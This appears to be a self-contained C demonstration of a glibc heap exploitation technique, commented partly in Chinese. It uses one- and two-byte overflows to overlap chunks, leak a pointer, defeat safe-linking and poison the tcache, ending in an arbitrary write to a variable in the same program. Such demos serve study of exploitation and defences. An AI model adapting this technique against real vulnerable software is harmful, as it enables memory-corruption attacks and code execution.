#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <inttypes.h>
#include <assert.h>

// Free and NULL out pointer, preventing UAF
#define SAFE_FREE(p) { free(p); p = NULL; }

// 1-byte overflow. Sets overflown chunk's mchunk_rev_size to 0x140 and
// mchunk_size to 0xa0 (clearing the PREV_INUSE flag)
char *payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\x01\x00\x00\x00\x00"
                "\x00\x00\xa0";

// 2-byte overflow. Sets overflown chunk's mchunk_size to 0x140
char *payload2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x41\x01";

uint64_t arbitrary_variable = 0x11111111;

int bypass_demo() {
    void *tcache_allocs[7];

    for( int i = 0; i < 7; i++)
        tcache_allocs[i] = malloc(0x98);

    char *chunkA = malloc(0x98);
    char *chunkB = malloc(0x98);
    char *chunkC = malloc(0x98);
    char *chunkD = malloc(0xb8);

    // 填滿 tcache
    for (int i = 0; i < 7; i++)
        SAFE_FREE(tcache_allocs[i]);

    // put into unsorted bin
    SAFE_FREE(chunkB);

    // bof to D and unset its prev_inuse bit: prev_size == 0x140, size == 0xa0
    memcpy(chunkC, payload, 0x99);
    // fake chunk size
    chunkD[0x98] = '\x21';

    // overwrite chkB size from 0xa0 to 0x140, and concat with chkD
    memcpy(chunkA, payload2, 0x9a);

    // consolidate with chkB，並將 chunk 放到 unsorted bin
    SAFE_FREE(chunkD);

    // empty tcache
    for (int i = 0; i < 7; i++)
        tcache_allocs[i] = malloc(0x98);

    char *junk = malloc(0x98); // 從 unsorted bin 拿 chunk，會拿到 chunk B 的位址
    char *chunkC2 = malloc(0x98); // 從 unsorted bin 拿 chunk，會拿到 chunk C 的位址
    assert(chunkC == chunkC2);

    SAFE_FREE(chunkC2); // 將 chunkC2 放到 tcache 內，不過 chunkC 仍然可以被使用
    // e->next = PROTECT_PTR (&e->next, tcache->entries[tc_idx]) ==> e->next = PROTECT_PTR (&e+0x10, 0)

    uint64_t L12 = *(int64_t *)chunkC;
    // get L12, e.g. 0x55f9755ba840 --> 0x55f9755ba

    // xor 任意的記憶體位址，最後 4 bits 不 xor 是因為要確定 alignment
    uint64_t masked_ptr = L12 ^ (((uint64_t) &arbitrary_variable) & ~0xf);

    uint64_t *chunkC3 = malloc(0x98); // 第三次取得 chkC
    assert(chunkC == chunkC3);

    SAFE_FREE(tcache_allocs[0]); // free 掉之前存在於 tcache 的一塊 chunk
    SAFE_FREE(chunkC3);
    *(uint64_t *) chunkC = masked_ptr; // 覆蓋成 &arbitrary_variable
    
    char *junk2 = malloc(0x98); // 第四次取得 chkC

    uint64_t *winner = malloc(0x98); // 此位置會等於 &arbitrary_variable
    *(winner+1) = 0x112233445566;
    assert(*(&arbitrary_variable+1) == 0x112233445566);
}

// Reference from: https://e28b174e-d342-4a10-972e-a985c56398b8.usrfiles.com/ugd/e28b17_669515e9578e4196add11802ed1d8984.txt
int main()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    bypass_demo();
    return 0;
}